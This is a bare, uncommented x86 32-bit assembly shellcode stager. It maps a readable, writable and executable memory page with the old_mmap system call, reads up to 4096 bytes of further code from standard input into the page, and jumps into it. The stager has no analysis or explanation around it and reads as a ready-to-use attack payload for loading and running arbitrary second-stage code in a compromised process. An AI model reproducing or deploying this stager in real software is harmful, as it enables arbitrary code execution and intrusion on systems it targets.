        .intel_syntax noprefix
        .globl _start
_start:
        push 90
        pop eax
        cdq
        mov ecx, edx
        inc edx
        shl edx, 12
        push ecx
        push -1
        push 0x22
        push 7
        push edx
        push ecx
        mov ebx, esp
        int 0x80
        xchg ecx, eax
        xchg ebx, eax
        lea eax, [ebx+3]
        int 0x80
        jmp ecx
